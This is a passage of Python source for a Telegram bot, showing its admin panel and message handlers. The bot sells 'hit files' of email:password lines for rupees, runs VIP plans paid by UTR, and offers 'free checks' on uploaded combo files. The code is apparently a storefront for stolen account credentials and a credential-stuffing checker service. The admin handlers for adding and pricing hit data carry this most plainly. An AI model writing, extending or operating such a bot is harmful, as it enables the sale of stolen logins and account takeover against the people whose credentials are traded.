            f"<i>Note: ~{total_users * 0.3 / 60:.0f} minutes estimated at 300ms/user.</i>",
            back_btn("admin_channels")
        )
        asyncio.create_task(run_channel_membership_sweep(chat_id))
        return

    if data == "admin_add_channel":
        user_state[chat_id] = {"action": "admin_add_channel"}
        await edit(
            f"📌 {b('Add Required Channel')}\n\n"
            f"Send the channel in any of these formats:\n\n"
            f"<b>Public channel:</b>\n"
            f"• <code>@username</code>\n"
            f"• <code>https://t.me/username</code>\n"
            f"Bot must be <b>Admin</b> in the channel.\n\n"
            f"<b>Private channel:</b>\n"
            f"• <code>https://t.me/+INVITELINK</code>\n"
            f"You will be asked for the Chat ID next.\n"
            f"Bot must be <b>Admin</b> in the private channel too.",
            back_btn("admin_channels")
        )
        return

    if data.startswith("admin_remove_channel_"):
        idx = int(data.replace("admin_remove_channel_", ""))
        channels = get_channels()
        if 0 <= idx < len(channels):
            removed = channels.pop(idx)
            save_channels(channels)
            await edit(f"✅ Removed channel {b(removed.label)}.", back_btn("admin_channels"))
        else:
            await edit("❌ Channel not found.", back_btn("admin_channels"))
        return

    if data == "admin_add_product":
        user_state[chat_id] = {"action": "admin_add_product_name"}
        await edit(f"📦 {b('Add Product')}\n\nStep 1: Enter the product name:")
        return

    if data == "admin_add_hit":
        await edit(f"💥 {b('Add Hit')}\n\nChoose how to add:", reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📁 Send Hit File (.txt)", callback_data="admin_add_hit_file")],
            [InlineKeyboardButton("✏️ Enter Hit Manually", callback_data="admin_add_hit_manual")],
            [InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")],
        ]))
        return

    if data == "admin_add_hit_file":
        user_state[chat_id] = {"action": "admin_hit_file_name"}
        await edit(f"📁 {b('Add Hit File')}\n\nEnter the hit name:")
        return

    if data == "admin_add_hit_manual":
        user_state[chat_id] = {"action": "admin_hit_manual_name"}
        await edit(f"✏️ {b('Add Hit Manually')}\n\nEnter the hit name:")
        return

    if data == "admin_view_products":
        prods = cursor.execute("SELECT * FROM products").fetchall()
        text = f"📦 {b('Products')}\n\n"
        if not prods:
            text += "None yet."
        else:
            for p in prods:
                text += f"[{p['id']}] {b(p['name'])} — ₹{p['price']} | Qty: {'∞' if p['quantity'] == -1 else p['quantity']}\n"
        await edit(text, reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🗑️ Delete Product", callback_data="admin_delete_product")],
            [InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")],
        ]))
        return

    if data == "admin_delete_product":
        user_state[chat_id] = {"action": "admin_delete_product_id"}
        await edit("Enter the product ID to delete:")
        return

    if data == "admin_view_hits":
        hfs = cursor.execute("SELECT id,name,price,quantity FROM hit_files").fetchall()
        text = f"🎯 {b('Hit Files')}\n\n"
        if not hfs:
            text += "None yet."
        else:
            for h in hfs:
                text += f"[{h['id']}] {b(h['name'])} — ₹{h['price']} | Qty: {'∞' if h['quantity'] == -1 else h['quantity']}\n"
        await edit(text, reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🗑️ Delete Hit File", callback_data="admin_delete_hit_file")],
            [InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")],
        ]))
        return

    if data == "admin_delete_hit_file":
        user_state[chat_id] = {"action": "admin_delete_hit_file_id"}
        await edit("Enter the hit file ID to delete:")
        return

    if data == "admin_set_prices":
        subs = cursor.execute("SELECT * FROM subscriptions ORDER BY days ASC").fetchall()
        text = f"💎 {b('VIP Prices')}\n\n"
        for s in subs:
            text += f"[{s['id']}] {s['days']} Day(s) — ₹{s['price']}\n"
        text += f"\nSend: {code('ID NewPrice')} e.g. {code('1 149')}"
        user_state[chat_id] = {"action": "admin_set_price"}
        await edit(text)
        return

    if data == "admin_view_users":
        tot = cursor.execute("SELECT COUNT(*) as c FROM users").fetchone()["c"]
        vips = cursor.execute("SELECT COUNT(*) as c FROM users WHERE is_vip=1 AND (vip_expires_at=-1 OR vip_expires_at>?)", (int(time.time() * 1000),)).fetchone()["c"]
        users = cursor.execute("SELECT * FROM users ORDER BY joined_at DESC LIMIT 10").fetchall()
        text = f"👥 {b(f'Users ({tot} total, {vips} VIP)')}\n\nLast 10:\n"
        for u in users:
            un = f"@{esc(u['username'])}" if u["username"] else esc(u["first_name"])
            text += f"{'💎' if is_vip(u) else '👤'} {un} [{code(u['chat_id'])}] pts:{u.get('referral_points', 0)} fc:{u.get('free_checks', 0)}\n"
        await edit(text, back_btn("admin_panel"))
        return

    if data == "admin_grant_vip":
        user_state[chat_id] = {"action": "admin_grant_vip"}
        await edit(f"Enter: {code('ChatID Days')} (e.g. {code('123456789 30')})\nUse -1 for lifetime:")
        return

    if data == "admin_add_points":
        user_state[chat_id] = {"action": "admin_add_points"}
        await edit(
            f"🎁 {b('Add Points to User')}\n\nEnter: {code('ChatID Amount')} (e.g. {code('123456789 50')})\n\nPoints will be added to the user's referral points balance."
        )
        return

    if data == "admin_stats":
        tot = cursor.execute("SELECT COUNT(*) as c FROM users").fetchone()["c"]
        vips = cursor.execute("SELECT COUNT(*) as c FROM users WHERE is_vip=1 AND (vip_expires_at=-1 OR vip_expires_at>?)", (int(time.time() * 1000),)).fetchone()["c"]
        tot_h = cursor.execute("SELECT COUNT(*) as c FROM hits").fetchone()["c"]
        pend = cursor.execute("SELECT COUNT(*) as c FROM pending_payments WHERE status='pending_admin'").fetchone()["c"]
        await edit(f"📊 {b('Admin Stats')}\n\n👥 Users: {tot}\n💎 VIP: {vips}\n✅ Hits: {tot_h}\n⏳ Pending: {pend}", reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("⏳ Pending Payments", callback_data="admin_pending_payments")],
            [InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")],
        ]))
        return

    if data == "admin_pending_payments":
        pends = cursor.execute("SELECT * FROM pending_payments WHERE status='pending_admin' ORDER BY created_at DESC LIMIT 10").fetchall()
        if not pends:
            await edit("✅ No pending payments.", back_btn("admin_panel"))
            return
        await edit(f"⏳ {b(f'{len(pends)} pending payment(s)')} — sending details below...")
        for p in pends:
            u = get_user(p["chat_id"])
            un = f"@{esc(u['username'])}" if u and u["username"] else esc(u["first_name"]) if u else str(p["chat_id"])
            await send(chat_id,
                f"💳 {b('Payment Request')}\n\nUser: {un} [{code(p['chat_id'])}]\nPlan: {b(days_label(p['plan_days']))} VIP\nPrice: ₹{p['price']}\nUTR: {code(p['utr'])}",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("✅ Approve", callback_data=f"approve_payment_{p['id']}"), InlineKeyboardButton("❌ Reject", callback_data=f"reject_payment_{p['id']}")]]))
        return

    if data.startswith("approve_payment_"):
        pid = int(data.replace("approve_payment_", ""))
        payment = cursor.execute("SELECT * FROM pending_payments WHERE id=?", (pid,)).fetchone()
        if not payment: return
        exp = -1 if payment["plan_days"] == -1 else int(time.time() * 1000) + payment["plan_days"] * 86400000
        cursor.execute("UPDATE users SET is_vip=1, vip_expires_at=? WHERE chat_id=?", (exp, payment["chat_id"]))
        cursor.execute("UPDATE pending_payments SET status='approved' WHERE id=?", (pid,))
        conn.commit()
        await send(payment["chat_id"],
            f"🎉 {b('Congratulations!')}\n\nPayment approved!\n\n💎 Package: {b(days_label(payment['plan_days']) + ' VIP')}\n✅ {b('Package Successful!')}\n\nEnjoy full VIP access!",
            reply_markup=main_menu(payment["chat_id"])
        )
        await edit(f"✅ Approved! User {code(payment['chat_id'])} → {b(days_label(payment['plan_days']))} VIP.")
        return

    if data.startswith("reject_payment_"):
        pid = int(data.replace("reject_payment_", ""))
        payment = cursor.execute("SELECT * FROM pending_payments WHERE id=?", (pid,)).fetchone()
        if not payment: return
        cursor.execute("UPDATE pending_payments SET status='rejected' WHERE id=?", (pid,))
        conn.commit()
        await send(payment["chat_id"], f"❌ {b('Payment Rejected')}\n\nUTR {code(payment['utr'])} could not be verified.\n\nContact support: {b(SUPPORT)}")
        await edit(f"❌ Rejected payment for user {code(payment['chat_id'])}.")
        return

    if data == "admin_broadcast":
        user_state[chat_id] = {"action": "admin_broadcast_target"}
        total = cursor.execute("SELECT COUNT(*) as c FROM users").fetchone()["c"]
        vips = cursor.execute("SELECT COUNT(*) as c FROM users WHERE is_vip=1 AND (vip_expires_at=-1 OR vip_expires_at>?)", (int(time.time() * 1000),)).fetchone()["c"]
        free = total - vips
        await edit(
            f"📢 {b('Broadcast')}\n\nChoose who to send to:\n\n👥 All users: {b(total)}\n💎 VIP only: {b(vips)}\n🆓 Free users only: {b(free)}",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton(f"👥 All Users ({total})", callback_data="bcast_target_all")],
                [InlineKeyboardButton(f"💎 VIP Only ({vips})", callback_data="bcast_target_vip")],
                [InlineKeyboardButton(f"🆓 Free Only ({free})", callback_data="bcast_target_free")],
                [InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")],
            ])
        )
        return

    if data.startswith("bcast_target_"):
        target = data.replace("bcast_target_", "")
        user_state[chat_id] = {"action": "admin_broadcast_msg", "data": {"target": target}}
        label = "all users" if target == "all" else ("VIP users only" if target == "vip" else "free users only")
        await edit(f"📢 {b(f'Broadcast → {label}')}\n\nSend your message now.\nYou can also send a <b>photo with caption</b> to include an image.\n\n<i>Send /cancel to abort.</i>")
        return

    if data == "bcast_confirm":
        st = user_state.get(chat_id)
        if not st or st["action"] != "admin_broadcast_preview": return
        target = st["data"]["target"]
        text = st["data"]["text"]
        photo_id = st["data"].get("photoId")
        del user_state[chat_id]

        recipients = []
        if target == "all":
            recipients = cursor.execute("SELECT chat_id FROM users WHERE is_banned=0").fetchall()
        elif target == "vip":
            recipients = cursor.execute("SELECT chat_id FROM users WHERE is_vip=1 AND is_banned=0 AND (vip_expires_at=-1 OR vip_expires_at>?)", (int(time.time() * 1000),)).fetchall()
        else: # free
            recipients = cursor.execute("SELECT chat_id FROM users WHERE (is_vip=0 OR vip_expires_at<=?) AND is_banned=0", (int(time.time() * 1000),)).fetchall()
        
        sent = 0
        failed = 0
        await send(chat_id, f"⏳ Sending to {len(recipients)} users...")
        for u in recipients:
            try:
                if photo_id:
                    await application.bot.send_photo(u["chat_id"], photo_id, caption=f"📢 {b('Announcement')}\n\n{text}", parse_mode="HTML")
                else:
                    await application.bot.send_message(u["chat_id"], f"📢 {b('Announcement')}\n\n{text}", parse_mode="HTML")
                sent += 1
            except telegram.error.TelegramError as e:
                logger.error(f"Broadcast failed for {u['chat_id']}: {e}")
                failed += 1
        await send(chat_id, f"✅ {b('Broadcast complete!')}\n\n✅ Sent: {b(sent)}\n❌ Failed: {b(failed)}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]])
        )
        return

    if data == "bcast_cancel":
        del user_state[chat_id]
        await edit("❌ Broadcast cancelled.", back_btn("admin_panel"))
        return

    # --- Ban User ---
    if data == "admin_ban_user":
        user_state[chat_id] = {"action": "admin_ban_user_id"}
        await edit(f"🚫 {b('Ban User')}\n\nEnter the {b('Chat ID')} of the user to ban:")
        return

    # --- Unban User ---
    if data == "admin_unban_user":
        user_state[chat_id] = {"action": "admin_unban_user_id"}
        await edit(f"✅ {b('Unban User')}\n\nEnter the {b('Chat ID')} of the user to unban:")
        return

    if data.startswith("do_ban_"):
        tid = int(data.replace("do_ban_", ""))
        tu = get_user(tid)
        if not tu: await edit("❌ User not found.", back_btn("admin_panel")); return
        cursor.execute("UPDATE users SET is_banned=1 WHERE chat_id=?", (tid,))
        conn.commit()
        un = f"@{esc(tu['username'])}" if tu["username"] else esc(tu["first_name"])
        await send(tid, f"🚫 {b('You have been banned')} from this bot.\n\nContact support if you believe this is a mistake: {b(SUPPORT)}")
        await edit(f"✅ User {b(un)} [{code(tid)}] has been {b('banned')}.", back_btn("admin_panel"))
        return

    if data.startswith("do_unban_"):
        tid = int(data.replace("do_unban_", ""))
        tu = get_user(tid)
        if not tu: await edit("❌ User not found.", back_btn("admin_panel")); return
        cursor.execute("UPDATE users SET is_banned=0 WHERE chat_id=?", (tid,))
        conn.commit()
        un = f"@{esc(tu['username'])}" if tu["username"] else esc(tu["first_name"])
        await send(tid, f"✅ {b('Your ban has been lifted!')} You can now use the bot again.", reply_markup=main_menu(tid))
        await edit(f"✅ User {b(un)} [{code(tid)}] has been {b('unbanned')}.", back_btn("admin_panel"))
        return

    # --- Revoke VIP ---
    if data == "admin_revoke_vip":
        user_state[chat_id] = {"action": "admin_revoke_vip_id"}
        await edit(f"❌ {b('Revoke VIP')}\n\nEnter the {b('Chat ID')} of the user to revoke VIP from:")
        return

    # --- Search User ---
    if data == "admin_search_user":
        user_state[chat_id] = {"action": "admin_search_user_query"}
        await edit(f"🔍 {b('Search User')}\n\nEnter a {b('Chat ID')} or {b('@username')} to look up:")
        return

async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    msg = update.effective_message
    chat_id = msg.chat.id
    try: ensure_user(msg)
    except Exception as e: logger.error(f"Error ensuring user in message handler: {e}")

    if msg.text and msg.text.startswith("/"): return
    if msg.document or msg.photo: return

    state = user_state.get(chat_id)
    if not state: return

    user = get_user(chat_id)
    admin = is_admin(chat_id)

    # --- UTR submission ---
    if state["action"] == "awaiting_utr":
        utr = msg.text.strip() if msg.text else ""
        if not utr or len(utr) < 5:
            await send(chat_id, "❌ Please enter a valid UTR (min 5 chars).")
            return
        
        days = state["data"]["days"]
        price = state["data"]["price"]
        
        cursor.execute(
            "INSERT INTO pending_payments (chat_id,plan_days,price,utr,status,created_at) VALUES (?,?,?,?,'pending_admin',?)",
            (chat_id, days, price, utr, int(time.time() * 1000))
        )
        pid = cursor.lastrowid
        conn.commit()
        
        del user_state[chat_id]
        await send(chat_id, f"✅ {b('UTR Submitted!')}\n\nUTR: {code(utr)}\n\nUnder review. You'll be notified on approval.", reply_markup=main_menu(chat_id))
        
        u = user
        un = f"@{esc(u['username'])}" if u and u["username"] else esc(u["first_name"]) if u else str(chat_id)
        for admin_id in get_admin_ids():
            await send(admin_id,
                f"💳 {b('New Payment Request!')}\n\nUser: {un} [{code(chat_id)}]\nPlan: {b(days_label(days))} VIP\nPrice: ₹{price}\nUTR: {code(utr)}",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("✅ Approve", callback_data=f"approve_payment_{pid}"), InlineKeyboardButton("❌ Reject", callback_data=f"reject_payment_{pid}")]])
            )
        return

    if state["action"] == "awaiting_combo_file":
        await send(chat_id, "⚠️ Please send a .txt file.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="main_menu")]]))
        return

    # --- Redeem: Send Points — enter target chat ID ---
    if state["action"] == "send_points_id":
        raw = msg.text.strip() if msg.text else ""
        try:
            target_id = int(raw)
        except ValueError:
            await send(chat_id, "❌ Invalid Chat ID. Enter a valid numeric Telegram Chat ID:")
            return
        
        if target_id == chat_id:
            await send(chat_id, "❌ You cannot send points to yourself.")
            return
        
        target_user = get_user(target_id)
        if not target_user:
            await send(chat_id,
                f"❌ User {code(target_id)} has not started the bot yet.\n\n<i>Please ask them to start the bot first, then try again.</i>",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="redeem")]])
            )
            del user_state[chat_id]
            return
        
        sender_pts = state["data"]["senderPts"]
        user_state[chat_id] = {"action": "send_points_amount", "data": {"targetId": target_id, "senderPts": sender_pts, "targetName": target_user.get("username") or target_user.get("first_name")}}
        await send(chat_id,
            f"👤 Sending points to: {b(esc(target_user.get('username') or target_user.get('first_name')))}\n\nYou have {b(sender_pts)} points.\nHow many points do you want to send?"
        )
        return

    # --- Redeem: Send Points — enter amount ---
    if state["action"] == "send_points_amount":
        try:
            amount = int(msg.text.strip()) if msg.text else 0
        except ValueError:
            await send(chat_id, "❌ Enter a valid number greater than 0:")
            return
        
        target_id = state["data"]["targetId"]
        sender_pts = state["data"]["senderPts"]
        target_name = state["data"]["targetName"]

        if amount <= 0:
            await send(chat_id, "❌ Enter a valid number greater than 0:")
            return
        
        fresh_sender = get_user(chat_id)
        if (fresh_sender.get("referral_points", 0) if fresh_sender else 0) < amount:
            await send(chat_id, f"❌ You only have {b(fresh_sender.get('referral_points', 0) if fresh_sender else 0)} points. Enter a smaller amount:")
            return
        
        cursor.execute("UPDATE users SET referral_points=referral_points-? WHERE chat_id=?", (amount, chat_id))
        cursor.execute("UPDATE users SET referral_points=referral_points+? WHERE chat_id=?", (amount, target_id))
        conn.commit()
        del user_state[chat_id]
        await update_leaderboard_vip()

        new_sender = get_user(chat_id)
        new_target = get_user(target_id)
        sender_name = f"@{esc(fresh_sender['username'])}" if fresh_sender and fresh_sender["username"] else esc(fresh_sender["first_name"]) if fresh_sender else "Someone"

        await send(chat_id,
            f"✅ {b('Points Sent!')}\n\nSent {b(amount)} points to {b(esc(target_name))}.\nYour remaining points: {b(new_sender.get('referral_points', 0) if new_sender else 0)}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🎁 Redeem More", callback_data="redeem")], [InlineKeyboardButton("🔙 Main Menu", callback_data="main_menu")]])
        )
        await send(target_id,
            f"🎁 {b('Points Received!')}\n\n{b(esc(sender_name))} sent you {b(f'{amount} points')}!\n\nYour total points: {b(new_target.get('referral_points', 0) if new_target else 0)}\n\n<i>• {POINTS_PER_CHECK} pts = 1 free check\n• {POINTS_PER_VIP2D} pts = 2 days VIP\n\nTap 🎁 Redeem to use them!</i>",
            reply_markup=main_menu(target_id)
        )
        return

    if not admin: return

    # --- Admin text handlers ---
    if state["action"] == "admin_panel_add_admin":
        if chat_id not in SUPER_ADMIN_IDS:
            del user_state[chat_id]
            return
        input_str = msg.text.strip() if msg.text else ""
        if not input_str.isdigit():
            await send(chat_id, f"❌ Please send a valid numeric Telegram User ID.\n\nExample: {code('6820734853')}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="admin_manage_admins")]]))
            return
        target_id = int(input_str)
        if target_id in SUPER_ADMIN_IDS:
            await send(chat_id, f"ℹ️ {code(target_id)} is already a super admin.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Manage Admins", callback_data="admin_manage_admins")]]))
            del user_state[chat_id]
            return
        if is_admin(target_id):
            await send(chat_id, f"ℹ️ {code(target_id)} is already an admin.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Manage Admins", callback_data="admin_manage_admins")]]))
            del user_state[chat_id]
            return
        add_extra_admin(target_id)
        tu = get_user(target_id)
        un = f"@{esc(tu['username'])}" if tu and tu["username"] else esc(tu["first_name"]) if tu else str(target_id)
        await send(chat_id, f"✅ {b(un)} [{code(target_id)}] has been {b('added as admin')}.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Manage Admins", callback_data="admin_manage_admins")]]))
        try:
            await send(target_id, f"🔧 {b('You have been made an Admin!')}\n\nYou now have full admin access to this bot.\n\nUse /admin to open the admin panel.")
        except Exception:
            pass
        del user_state[chat_id]
        return

    if state["action"] == "admin_add_channel":
        input_str = msg.text.strip() if msg.text else ""
        if not input_str:
            await send(chat_id, "❌ Please send a valid channel username or link.")
            return
        
        entry = parse_channel_input(input_str)
        if not entry:
            await send(chat_id, "❌ Could not parse that. Try @username or a t.me link.")
            return

        if entry.id is None: # Private invite link
            user_state[chat_id] = {"action": "admin_add_channel_id", "data": {"link": entry.link}}
            await send(chat_id,
                f"🔒 {b('Private Channel — Step 2 of 2')}\n\n"
                f"Invite link saved: <code>{entry.link}</code>\n\n"
                f"Now send the <b>Chat ID</b> of this private channel so the bot can verify membership.\n\n"
                f"<b>How to get the Chat ID:</b>\n"
                f"1. Add @userinfobot or @username_to_id_bot to the private channel\n"
                f"2. It will reply with the Chat ID (a negative number like <code>-1001234567890</code>)\n\n"
                f"Or forward any message from the channel to @userinfobot.\n\n"
                f"Send <code>skip</code> to add without verification (join button only).",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="admin_channels")]])
            )
            return
        
        # Public channel
        channels = get_channels()
        if any(c.id == entry.id for c in channels):
            await send(chat_id, "⚠️ That channel is already in the list.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📌 Channels", callback_data="admin_channels")]]))
            del user_state[chat_id]
            return
        
        channels.append(entry)
        save_channels(channels)
        del user_state[chat_id]
        await send(chat_id,
            f"✅ Added {b(entry.label)}.\n\nTotal required channels: {b(len(channels))}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📌 Channels", callback_data="admin_channels")]])
        )
        return

    if state["action"] == "admin_add_channel_id":
        input_str = msg.text.strip() if msg.text else ""
        if not input_str:
            await send(chat_id, "❌ Send the Chat ID or 'skip'.")
            return
        
        link = state["data"]["link"]

        if input_str.lower() == "skip":
            entry = ChannelEntry(id=None, link=link, label="Private Channel")
            channels = get_channels()
            channels.append(entry)
            save_channels(channels)
            del user_state[chat_id]
            await send(chat_id,
                f"✅ Added private channel (join button only — no membership verification).\n\nTotal: {b(len(channels))}",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📌 Channels", callback_data="admin_channels")]])
            )
            return

        if not re.match(r"^-?\d{5,}$", input_str):
            await send(chat_id, "❌ That doesn't look like a valid Chat ID. It should be a large negative number like <code>-1001234567890</code>. Try again or send <code>skip</code>.")
            return
        
        channel_id_str = input_str if input_str.startswith("-") else f"-100{input_str}"

        await send(chat_id, "⏳ Verifying bot has access to that channel...")
        try:
            if application and application.bot:
                await application.bot.get_chat_member(chat_id=channel_id_str, user_id=chat_id)
        except telegram.error.TelegramError as e:
            await send(chat_id,
                f"❌ {b('Verification failed.')}\n\n"
                f"Could not access <code>{channel_id_str}</code>.\n\n"
                f"Make sure:\n• The bot is an <b>Administrator</b> in the private channel\n• The Chat ID is correct\n\nTry again or send <code>skip</code> to add without verification."
            )
            return
        
        label = f"Private ({channel_id_str})"
        try:
            if application and application.bot:
                chat_info = await application.bot.get_chat(channel_id_str)
                if chat_info.title: label = chat_info.title
        except telegram.error.TelegramError:
            pass

        entry = ChannelEntry(id=channel_id_str, link=link, label=label)
        channels = get_channels()
        if any(c.id == channel_id_str for c in channels):
            await send(chat_id, "⚠️ That channel is already in the list.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📌 Channels", callback_data="admin_channels")]]))
            del user_state[chat_id]
            return
        
        channels.append(entry)
        save_channels(channels)
        del user_state[chat_id]
        await send(chat_id,
            f"✅ {b('Private channel added with full verification!')}\n\n"
            f"📛 Name: {b(esc(label))}\n🔑 Chat ID: <code>{channel_id_str}</code>\n🔗 Invite: {link}\n\nTotal required channels: {b(len(channels))}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📌 Channels", callback_data="admin_channels")]])
        )
        return

    if state["action"] == "admin_add_product_name":
        name = msg.text.strip() if msg.text else ""
        if not name: await send(chat_id, "❌ Name cannot be empty."); return
        user_state[chat_id] = {"action": "admin_add_product_price", "data": {"name": name}}
        await send(chat_id, f"Price for {b(name)} (₹):")
        return
    
    if state["action"] == "admin_add_product_price":
        try:
            price = float(msg.text.strip()) if msg.text else 0.0
        except ValueError:
            await send(chat_id, "❌ Invalid price."); return
        if price <= 0: await send(chat_id, "❌ Invalid price."); return
        user_state[chat_id] = {"action": "admin_add_product_qty", "data": {**state["data"], "price": price}}
        await send(chat_id, "Quantity (-1 for unlimited):")
        return
    
    if state["action"] == "admin_add_product_qty":
        try:
            qty = int(msg.text.strip()) if msg.text else -1
        except ValueError:
            qty = -1 # Default to unlimited if invalid
        user_state[chat_id] = {"action": "admin_add_product_desc", "data": {**state["data"], "quantity": qty}}
        await send(chat_id, f"Description (or {code('-')} to skip):")
        return
    
    if state["action"] == "admin_add_product_desc":
        desc = msg.text.strip() if msg.text else ""
        if desc == "-": desc = ""
        name = state["data"]["name"]
        price = state["data"]["price"]
        quantity = state["data"]["quantity"]
        cursor.execute("INSERT INTO products (name,price,quantity,description) VALUES (?,?,?,?)", (name, price, quantity, desc))
        conn.commit()
        del user_state[chat_id]
        await send(chat_id, f"✅ {b('Product Added!')}\n{b(name)} — ₹{price} | Qty: {'∞' if quantity == -1 else quantity}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]])
        )
        return
    
    if state["action"] == "admin_delete_product_id":
        try:
            prod_id = int(msg.text.strip()) if msg.text else 0
        except ValueError:
            await send(chat_id, "❌ Invalid ID."); del user_state[chat_id]; return
        
        p = cursor.execute("SELECT * FROM products WHERE id=?", (prod_id,)).fetchone()
        if not p: await send(chat_id, "❌ Not found."); del user_state[chat_id]; return
        cursor.execute("DELETE FROM products WHERE id=?", (prod_id,))
        conn.commit()
        del user_state[chat_id]
        await send(chat_id, f"✅ Deleted {b(p['name'])}.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]])
        )
        return
    
    if state["action"] == "admin_hit_file_name":
        name = msg.text.strip() if msg.text else ""
        if not name: await send(chat_id, "❌ Name cannot be empty."); return
        user_state[chat_id] = {"action": "admin_hit_file_price", "data": {"name": name}}
        await send(chat_id, f"Price for {b(name)} (₹):")
        return
    
    if state["action"] == "admin_hit_file_price":
        try:
            price = float(msg.text.strip()) if msg.text else 0.0
        except ValueError:
            await send(chat_id, "❌ Invalid price."); return
        if price <= 0: await send(chat_id, "❌ Invalid price."); return
        user_state[chat_id] = {"action": "admin_hit_file_qty", "data": {**state["data"], "price": price}}
        await send(chat_id, "Quantity (-1 for unlimited):")
        return
    
    if state["action"] == "admin_hit_file_qty":
        try:
            qty = int(msg.text.strip()) if msg.text else -1
        except ValueError:
            qty = -1
        user_state[chat_id] = {"action": "admin_hit_file_upload", "data": {**state["data"], "quantity": qty}}
        await send(chat_id, f"✅ Now {b('send the .txt hit file')}:")
        return
    
    if state["action"] == "admin_hit_manual_name":
        name = msg.text.strip() if msg.text else ""
        if not name: return
        user_state[chat_id] = {"action": "admin_hit_manual_price", "data": {"name": name}}
        await send(chat_id, f"Price for {b(name)} (₹):")
        return
    
    if state["action"] == "admin_hit_manual_price":
        try:
            price = float(msg.text.strip()) if msg.text else 0.0
        except ValueError:
            await send(chat_id, "❌ Invalid price."); return
        if price <= 0: await send(chat_id, "❌ Invalid price."); return
        user_state[chat_id] = {"action": "admin_hit_manual_qty", "data": {**state["data"], "price": price}}
        await send(chat_id, "Quantity (-1 for unlimited):")
        return
    
    if state["action"] == "admin_hit_manual_qty":
        try:
            qty = int(msg.text.strip()) if msg.text else -1
        except ValueError:
            qty = -1
        user_state[chat_id] = {"action": "admin_hit_manual_content", "data": {**state["data"], "quantity": qty}}
        await send(chat_id, f"Now {b('paste the hit data')} (email:password lines):")
        return
    
    if state["action"] == "admin_hit_manual_content":
        content = msg.text.strip() if msg.text else ""
        name = state["data"]["name"]
        price = state["data"]["price"]
        quantity = state["data"]["quantity"]
        cursor.execute("INSERT INTO hit_files (name,price,quantity,content,created_at) VALUES (?,?,?,?,?)", (name, price, quantity, content, int(time.time() * 1000)))
        conn.commit()
        del user_state[chat_id]
        await send(chat_id, f"✅ {b('Hit Added!')}\n{b(name)} — ₹{price}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]])
        )
        return
    
    if state["action"] == "admin_delete_hit_file_id":
        try:
            hit_id = int(msg.text.strip()) if msg.text else 0
        except ValueError:
            await send(chat_id, "❌ Invalid ID."); del user_state[chat_id]; return
        
        h = cursor.execute("SELECT * FROM hit_files WHERE id=?", (hit_id,)).fetchone()
        if not h: await send(chat_id, "❌ Not found."); del user_state[chat_id]; return
        cursor.execute("DELETE FROM hit_files WHERE id=?", (hit_id,))
        conn.commit()
        del user_state[chat_id]
        await send(chat_id, f"✅ Deleted {b(h['name'])}.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]])
        )
        return
    
    if state["action"] == "admin_set_price":
        parts = (msg.text.strip() if msg.text else "").split(" ")
        if not parts or len(parts) < 2: await send(chat_id, f"❌ Format: {code('ID Price')}"); return
        try:
            sid = int(parts[0])
            new_p = float(parts[1])
        except ValueError:
            await send(chat_id, "❌ Invalid."); return
        
        if new_p <= 0: await send(chat_id, "❌ Invalid."); return
        sub = cursor.execute("SELECT * FROM subscriptions WHERE id=?", (sid,)).fetchone()
        if not sub: await send(chat_id, "❌ Plan not found."); return
        cursor.execute("UPDATE subscriptions SET price=? WHERE id=?", (new_p, sid))
        conn.commit()
        del user_state[chat_id]
        await send(chat_id, f"✅ {b(days_label(sub['days']))} VIP → ₹{new_p}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]])
        )
        return
    
    if state["action"] == "admin_grant_vip":
        parts = (msg.text.strip() if msg.text else "").split(" ")
        if not parts or len(parts) < 2: await send(chat_id, f"❌ Format: {code('ChatID Days')}"); return
        try:
            tid = int(parts[0])
            days = int(parts[1])
        except ValueError:
            await send(chat_id, "❌ Invalid."); return
        
        tu = get_user(tid)
        if not tu: await send(chat_id, f"❌ User {code(tid)} not found."); del user_state[chat_id]; return
        exp = -1 if days == -1 else int(time.time() * 1000) + days * 86400000
        cursor.execute("UPDATE users SET is_vip=1, vip_expires_at=? WHERE chat_id=?", (exp, tid))
        conn.commit()
        del user_state[chat_id]
        label = "Lifetime" if days == -1 else f"{days} days"
        await send(chat_id, f"✅ VIP granted to {code(tid)} for {b(label)}.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]])
        )
